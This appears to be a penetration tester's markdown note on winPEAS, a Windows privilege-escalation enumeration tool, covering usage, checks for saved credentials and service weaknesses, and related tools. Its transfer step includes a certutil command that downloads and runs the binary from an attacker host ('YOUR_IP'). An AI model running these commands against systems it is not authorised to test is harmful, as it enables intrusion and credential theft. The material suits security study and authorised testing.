---
tags: [tool, privesc, windows, enumeration]
tool: "winpeas"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# winpeas - Windows Privilege Escalation Enumeration

## Tool Overview
Purpose: Automated privilege escalation enumeration for Windows
Location: ~/tools/privesc/windows/winpeas.exe

## When to Use
- After gaining initial access to a Windows system
- To quickly identify potential privilege escalation vectors

## How to Use It

Basic Usage:
winpeas.exe

Save Output:
winpeas.exe > winpeas.txt

Specific Checks:
winpeas.exe servicesinfo
winpeas.exe applicationsinfo
winpeas.exe windowscreds

Transfer to Target:
On Kali: cd ~/tools/privesc/windows && python3 -m http.server 8000
On target: certutil -urlcache -f http://YOUR_IP:8000/winpeas.exe winpeas.exe && winpeas.exe

## What It Finds
- Service permissions
- Unquoted service paths
- AlwaysInstallElevated
- Saved credentials
- Registry misconfigurations
- Kernel exploit suggestions

## Related Tools
powerup, seatbelt, jaws, sherlock
